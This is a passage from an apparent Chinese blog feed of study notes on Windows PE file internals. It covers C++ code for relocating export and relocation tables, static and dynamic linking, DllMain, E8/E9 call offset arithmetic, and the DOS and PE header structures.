class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//复制AddressOfNames里的名字,修复AddressOfNames</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;NumberOfNames;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> Names_RVA=*(<span class="keyword">int</span>*)(FileBuffer+AddressOfNames_FOA+i*<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">int</span> Names_FOA = <span class="built_in">RVAtoFOA</span>(Names_RVA,FileBuffer);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span>*)(FileBuffer+section_FOA+full_add+i*<span class="number">4</span>)=<span class="built_in">FOAtoRVA</span>(full_add2,FileBuffer);</span><br><span class="line">        strsize = <span class="built_in">strlen</span>((<span class="keyword">char</span>*)(FileBuffer+Names_FOA));</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)(FileBuffer+full_add2),(<span class="keyword">char</span>*)(FileBuffer+Names_FOA),strsize+<span class="number">1</span>);</span><br><span class="line">        full_add2+=(strsize+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//复制IMAGE_EXPORT_DIRECTORY结构</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+full_add2),(FileBuffer+IET_FOA),<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修复IMAGE_EXPORT_DIRECTORY结构</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+full_add2+<span class="number">28</span>)=<span class="built_in">FOAtoRVA</span>(AddressOfFunctions_FOA_new,FileBuffer);</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+full_add2+<span class="number">32</span>)=<span class="built_in">FOAtoRVA</span>(AddressOfNames_FOA_new,FileBuffer);</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+full_add2+<span class="number">36</span>)=<span class="built_in">FOAtoRVA</span>(AddressOfNameOrdinals_FOA_new,FileBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修复目录项中的值，指向新的IMAGE_EXPORT_DIRECTORY</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>) = <span class="built_in">FOAtoRVA</span>(full_add2,FileBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写入文件</span></span><br><span class="line">    <span class="built_in">fwrite</span>(FileBuffer,<span class="number">1</span>,size,fp2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(FileBuffer);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x08-移动重定位表"><a href="#0x08-移动重定位表" class="headerlink" title="0x08 移动重定位表"></a>0x08 移动重定位表</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">movIBR</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> section_FOA=<span class="built_in">add</span>();</span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/c.exe&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    FILE* fp_w = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/d.exe&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp==<span class="literal">NULL</span>||fp_w==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span>* FileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="built_in">getlen</span>(fp);</span><br><span class="line">FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">int</span> RELOCATION_VirtualAddress = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>+<span class="number">40</span>);</span><br><span class="line">    <span class="keyword">int</span> RELOCATION_Size = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>+<span class="number">44</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> RELOCATION_FOA = <span class="built_in">RVAtoFOA</span>(RELOCATION_VirtualAddress,FileBuffer);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//移动</span></span><br><span class="line">    <span class="built_in">memcpy</span>(FileBuffer+section_FOA,FileBuffer+RELOCATION_FOA,RELOCATION_Size+<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">int</span> section_RVA=<span class="built_in">FOAtoRVA</span>(section_FOA,FileBuffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改VirtualAddress</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>+<span class="number">40</span>) = section_RVA;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">    <span class="built_in">fwrite</span>(FileBuffer,<span class="number">1</span>,size,fp_w);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp_w);</span><br><span class="line">    <span class="built_in">free</span>(FileBuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2020年12月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向-链接</title>
      <link href="/2020/10/27/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E9%93%BE%E6%8E%A5/"/>
      <url>/2020/10/27/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><p>生成lib文件，lib文件中存放着函数的内容。</p><p>静态链接是将程序运行所需要所有模块，在程序装载之前完成打包合并，生成可执行文件。</p><p>一旦程序需要更新，则程序需要重新链接。</p><br><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>生成lib文件和dll文件，lib文件中存放着函数的位置，dll文件存放着函数的内容</p><p>动态链接是将程序运行的模块相互分割开来，形成独立的文件，在程序运行时，才对程序运行时所需要的模块进行链接，其本质就是将链接的过程推迟到运行时处理。</p><p>如果第三方动态库需要更新，理论上只需要将第三方库覆盖旧的，不需要重新链接所有程序，动态链接的可扩展性和兼容性会更强。</p><p>动态链接的缺点是在装载的时候进行链接，会导致性能上有一些损失，不过用这些性能损失换取空间的节省和程序构建的灵活，很值得。</p><p><strong>lib文件有两个作用，一个是静态库，一个是dll文件的导入库。</strong></p><br><h1 id="DLL程序的入口函数DllMain"><a href="#DLL程序的入口函数DllMain" class="headerlink" title="DLL程序的入口函数DllMain"></a>DLL程序的入口函数DllMain</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数意义:<br>①<code>hModule</code>参数：指向DLL本身的实例句柄；</p><p>②<code>ul_reason_for_call</code>参数：指明了DLL被调用的原因，可以有以下4个取值：</p><ol><li><p>DLL_PROCESS_ATTACH：<br>当DLL被进程 &lt;&lt;第一次&gt;&gt; 调用时，导致DllMain函数被调用，同时ul_reason_for_call的值为DLL_PROCESS_ATTACH，如果同一个进程后来再次调用此DLL时，操作系统只会增加DLL的使用次数，不会再用DLL_PROCESS_ATTACH调用DLL的DllMain函数。</p></li><li><p>DLL_PROCESS_DETACH：<br>当DLL被从进程的地址空间解除映射时，系统调用了它的DllMain，传递的ul_reason_for_call值是DLL_PROCESS_DETACH。如果进程的终结是因为调用了TerminateProcess，系统就不会用DLL_PROCESS_DETACH来调用DLL的DllMain函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。</p></li><li><p>DLL_THREAD_ATTACH：<br>当进程创建一线程时，系统查看当前映射到进程地址空间中的所有DLL文件映像，并用值DLL_THREAD_ATTACH调用DLL的DllMain函数。 新创建的线程负责执行这次的DLL的DllMain函数，只有当所有的DLL都处理完这一通知后，系统才允许线程开始执行它的线程函数。</p></li><li><p>DLL_THREAD_DETACH：<br>如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread），系统查看当前映射到进程空间中的所有DLL文件映像，并用DLL_THREAD_DETACH来调用DllMain函数，通知所有的DLL去执行线程级的清理工作。<br>注意：如果线程的结束是因为系统中的一个线程调用了TerminateThread，系统就不会用值DLL_THREAD_DETACH来调用所有DLL的DllMain函数。</p></li></ol><p>③<code>lpReserved</code>参数：保留，目前没什么意义。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年10月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_硬编码</title>
      <link href="/2020/10/06/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E7%A1%AC%E7%BC%96%E7%A0%81/"/>
      <url>/2020/10/06/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E7%A1%AC%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-硬编码"><a href="#0x00-硬编码" class="headerlink" title="0x00 硬编码"></a>0x00 硬编码</h1><table><thead><tr><th>硬编码</th><th>汇编指令</th></tr></thead><tbody><tr><td>E8</td><td>call</td></tr><tr><td>E9</td><td>jmp</td></tr><tr><td>6A</td><td>push</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004011F8E8 53 FE FF FFcall00401050</span><br><span class="line">004011FD33 C0xoreax,eax</span><br></pre></td></tr></table></figure><p>X就是E8后面的值<code>53 FE FF FF</code></p><p>公式：</p><p><strong>call（E8）后面真正要跳转的地址=E8这条指令的下一行地址+X</strong><br><strong>X=call（E8）后面真正要跳转的地址-E8这条指令的下一行地址</strong></p><p><strong>E8这条指令的下一行地址=E8当前的地址+5</strong></p><p><strong>要跳转的地方=E8当前的地址+5+X</strong><br><strong>X=要跳转的地址-(E8的地址+5)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X=00401050-004011FD=FFFFFE53</span><br></pre></td></tr></table></figure><p>E9也是这么计算的</p><p>如果文件偏移和内存偏移不相同，在节区中需要转换一下。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年10月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_PE</title>
      <link href="/2020/09/21/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-PE/"/>
      <url>/2020/09/21/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-PE/</url>
      
        <content type="html"><![CDATA[<h1 id="有关C的小玩意"><a href="#有关C的小玩意" class="headerlink" title="有关C的小玩意"></a>有关C的小玩意</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译的过程：预处理 编译 汇编 链接</p><p>#define（什么都能替换）在预处理进行替换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1<span class="comment">//把1替换成true</span></span></span><br></pre></td></tr></table></figure><p>typedef（只能替换类型）在编译时进行替换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">max</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这两个实现的效果是一样的</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(A,B) ((A) &gt; (B)?(A):(B))</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">MAX</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>宏名标识符与左圆括号之间不允许有空白符，应紧接在一起。</li><li>宏与函数的区别：函数分配额外的堆栈空间，而宏只是替换。</li><li>为了避免出错，宏定义中给形参加上括号。</li><li>末尾不需要分号</li><li>define可以替代多行的代码，记得后面加\</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC(n,type)\</span></span><br><span class="line"><span class="meta">((n+ty\</span></span><br><span class="line"><span class="meta">pe))</span></span><br></pre></td></tr></table></figure><h2 id="堆（分配内存）"><a href="#堆（分配内存）" class="headerlink" title="堆（分配内存）"></a>堆（分配内存）</h2><p>说这个之前要先想想之前说过的程序运行时，会把程序分成的几个区域，分为<code>代码区</code>，<code>堆栈</code>，<code>堆</code>，<code>全局变量</code>，<code>常量区</code>。</p><p>首先要明确几点：</p><ol><li>在程序运行结束之后，所有内存空间都会被释放。</li><li>全局变量在程序运行时就会一直存在，直到程序结束被释放</li><li>堆栈在函数结束的时候被释放</li><li>堆由程序员自己定义，自己释放。如果没被自己释放，程序退出时也会被释放。</li></ol><p>简单说一下堆如果不释放会有什么危害，一个服务器或者大型程序几乎是很长时间不关闭的，如果此时堆用完不被释放，内存会被以及无用的数据占满，你的内存占有率就会越来越高，这就是内存泄漏。</p><p>一次内存泄漏似乎不会有大的影响，但内存泄漏堆积后的后果就是内存溢出。</p><p>malloc函数可以在堆中分配内存。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">size_t</span> size</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>可以看到malloc的函数类型是void*，因为你不知道要传给你是什么类型。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在堆中申请分配内存，分配128个int</span></span><br><span class="line"><span class="keyword">int</span>* ptr;</span><br><span class="line">ptr = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//要对申请的空间大小进行校验，判断是否申请成功</span></span><br><span class="line"><span class="keyword">if</span>(ptr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化分配的内存空间</span></span><br><span class="line"><span class="comment">//memset:sets buffers to specified character.</span></span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line">*ptr = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放空间</span></span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将指针设置为NULL</span></span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>建议看<a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/malloc?view=vs-2019">msdn链接</a></p><br><h1 id="分节"><a href="#分节" class="headerlink" title="分节"></a>分节</h1><p>在内存中运行的程序和在硬盘中的程序数据几乎是一样的，只有起始位置不一样（在内存中的起始位置是可以变的），一段数据，然后中间断开补上0，然后再一段数据。我们把PE的这种特征称为分节。</p><p>我们首先要明白几个概念：</p><h2 id="虚拟内存VA（简述）"><a href="#虚拟内存VA（简述）" class="headerlink" title="虚拟内存VA（简述）"></a>虚拟内存VA（简述）</h2><p>任何一个exe都有一个自己的独立的4GB内存空间，哪怕计算机的内存只有1GB，exe也有4GB。之所以是4GB，是因为32位计算机的寻址范围只有4GB。</p><p>其中低2GB给应用程序使用，高2GB给操作系统内核使用。</p><p>访问低2G的内存，写个入口函数main就可以；访问高2G的内存需要驱动。</p><h2 id="硬盘对齐和内存对齐"><a href="#硬盘对齐和内存对齐" class="headerlink" title="硬盘对齐和内存对齐"></a>硬盘对齐和内存对齐</h2><p>所有的对齐是为了增加读写的速度，找起来更快。</p><p>举个很形象的例子，假如说一本书，一页只有一个字，我们还是要给它一张纸，而不是只给它一个字的空间，这样可以增加读写的速度。</p><p>硬盘对齐：200h</p><p>内存对齐：1000h</p><p>老的编译器会进行这种操作，因为当时的硬盘空间小。</p><p><img src="https://i.loli.net/2020/09/23/XIDPWUlTSNEH9jw.png"></p><p>本来在内存中（图右）的数据在硬盘中（图左）存储会节省掉0的空间。</p><p>现在的硬盘变便宜，硬盘和内存对齐都变成一样。可以节省运算，可以用空间换时间。（由编译器决定）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>然后小小的总结一下分节的作用：</p><ol><li>节省硬盘空间（由编译器决定，也可能用空间换时间）</li><li>一个应用程序多开（节省内存）。</li></ol><p>第二个作用是这样的。</p><p>我们可以把分节想成这样：</p><p>假设：一个程序分出不同的节，分为只读的和可读可写的节。（例如qq）</p><p><img src="https://i.loli.net/2020/09/23/jmy4qzsELw63x9N.png" alt="image-20200923192237901"></p><p>我们想上多个qq。因为只读的节不会改变，所以只需要添加可读可写的节即可。</p><p><img src="https://i.loli.net/2020/09/23/kniXOTYGPDx32vf.png" alt="image-20200923191759340"></p><br><h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><p>PE文件是windows系统中遵循PE结构的文件，比如以.exe .dll为后缀名的文件以及系统驱动文件。</p><p>exe,sys,dll是操作系统上可执行文件，txt，docx，xls是由exe打开的，自己是没办法运行的。例如txt是由notepad.exe执行的，docx由word运行。</p><p>PE文件大体分为两部分，头(包括DOS头，PE文件头，块表)与主体(块)。</p><h2 id="基础概念："><a href="#基础概念：" class="headerlink" title="基础概念："></a>基础概念：</h2><p><strong>虚拟地址(VA)：</strong> 在一个程序运行起来的时候，会被加载到内存中，并且每个进程都有自己的4GB，这个4GB当中的某个位置叫做<strong>虚拟地址</strong>，由物理地址映射过来的，4GB的空间，并没有全部被用到。</p><p><strong>基地址( Imagebase ):</strong>    磁盘中的文件加载到内存当中的时候可以加载到任意位置，而这个位置就是程序的<strong>基址</strong>。EXE默认的加载基址是400000h,DLL文件默认基址是10000000h。需要注意的是基地址不是程序的入口点。</p><p><strong>相对虚拟地址(RVA):<strong>为了避免PE文件中有确定的内存地址，引入了相对虚拟地址的概念。RVA是在内存中相对与载入地址（</strong>基地址</strong>）的偏移量，所以你可以发现前三个概念的关系 ： <strong>虚拟地址(VA)=  基地址+ 相对虚拟地址(RVA)</strong></p><p><strong>文件偏移地址(FOA)：</strong>当PE文件储存在某个磁盘当中的时候，某个数据的位置相对于文件头的偏移量。</p><p><strong>入口点(OEP)：</strong>首先明确一个概念就是OEP是一个RVA，,然后使用 <strong>OEP</strong> + <strong>Imagebase</strong> == <strong>入口点的VA</strong>，通常情况下，OEP指向的不是<strong>main</strong>函数。</p><p><strong>RVA转化为FOA：</strong></p><p>判断内存中的区块的对齐大小（SectionAlignment）和文件中的区块的对齐大小（FileAlignment）是否相等，如果相等，RVA=FOA；</p><p>如果不相等，但是RVA的值小于所有头的尺寸大小（SizeOfHeaders），则RVA=FOA；</p><p>如果都不可以，则判断在哪个节中，RVA减掉VirtualAddress（当前节的 RVA 地址），然后再加上PointerToRawData（当前节的FOA地址）</p><h1 id="PE头解析"><a href="#PE头解析" class="headerlink" title="PE头解析"></a>PE头解析</h1><p>DOS头跟标准PE头的大小是确定的，option PE头是不确定的。</p><p>DOS头是64位，标准PE头是20位，option PE头32位系统中是224位（E0），64位系统中是240位（F0）</p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT</span><br><span class="line">&#123;</span><br><span class="line">+<span class="number">0</span>h WORD    e_magic   <span class="comment">//MZ(4Dh 5Ah)     DOS可执行文件标记</span></span><br><span class="line">+<span class="number">2</span>h     WORD    e_cblp</span><br><span class="line">+<span class="number">4</span>h WORD    e_cp</span><br><span class="line">+<span class="number">6</span>h WORD    e_crlc</span><br><span class="line">+<span class="number">8</span>h WORD    e_cparhdr</span><br><span class="line">+<span class="number">0</span>ah    WORD    e_minalloc</span><br><span class="line">+<span class="number">0</span>ch    WORD    e_maxalloc</span><br><span class="line">+<span class="number">0</span>eh    WORD    e_ss</span><br><span class="line">+<span class="number">10</span>h    WORD    e_sp</span><br><span class="line">+<span class="number">12</span>h    WORD    e_csum</span><br><span class="line">+<span class="number">14</span>h    WORD    e_ip</span><br><span class="line">+<span class="number">16</span>h    WORD    e_cs</span><br><span class="line">+<span class="number">18</span>h    WORD    e_lfarlc</span><br><span class="line">+<span class="number">1</span>ah    WORD    e_ovno</span><br><span class="line">+<span class="number">1</span>ch    WORD    e_res[<span class="number">4</span>]</span><br><span class="line">+<span class="number">24</span>h    WORD    e_oemid</span><br><span class="line">+<span class="number">26</span>h    WORD    e_oeminfo</span><br><span class="line">+<span class="number">29</span>h    WORD    e_res2[<span class="number">10</span>]</span><br><span class="line">+<span class="number">3</span>ch    DWORD   e_lfanew  <span class="comment">//RVA     指向PE文件头</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER ENDS</span><br></pre></td></tr></table></figure><p>DOS头是16位计算机用的，在32位计算机中有两个作用：</p><ol><li>在解析exe文件时，首先解析前两个字节看看是不是MZ</li><li>最后四个字节指向PE文件头（如果在内存中的值是E8 00 00 00，因为小端序值是E8，然后从文件开始（不是从DOS头结束），数E8个字节就是PE头的位置），DOS和PE的中间内容是编译器留的空间，可以自由发挥。</li></ol><h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><p><strong>IMAGE_NT_HEADERS STRUCT 结构体</strong>包含了标准PE头和可选PE头</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS STRUCT</span><br><span class="line">&#123;</span><br><span class="line">+<span class="number">0</span>h       DWORD    Signature<span class="comment">//50450000h(PE00)</span></span><br><span class="line">+<span class="number">4</span>h       IMAGE_FILE_HEADER    FileHeader</span><br><span class="line">+<span class="number">18</span>h      IMAGE_OPTIONAL_HEADER32   OptionalHeader</span><br><span class="line">&#125; IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure><p><strong>IMAGE_FILE_HEADER 结构体</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">structIMAGE_FILE_HEADER</span><br><span class="line">&#123;</span><br><span class="line">WORD Machine;<span class="comment">//运行平台(程序运行的CPU型号，在哪个CPU上可以运行)</span></span><br><span class="line">WORD NumberOfSections;<span class="comment">//节表的个数(PE中分了几个节)</span></span><br><span class="line">DWORD TimeDataStamp;<span class="comment">//文件创建时间，是从1970年至今的秒数</span></span><br><span class="line">DWORD PointerToSymbolicTable;<span class="comment">//指向符号表的指针</span></span><br><span class="line">DWORD NumberOfSymbols;<span class="comment">//符号表的数目</span></span><br><span class="line">WORD SizeOfOptionalHeader;<span class="comment">//IMAGE_NT_HEADERS结构中OptionHeader成员的大小，对于win32平台这个值通常是0x00e0，win64是0x00f0</span></span><br><span class="line">WORD Characteristics;<span class="comment">//文件的属性值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>IMAGE_OPTIONAL_HEADER 结构体</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 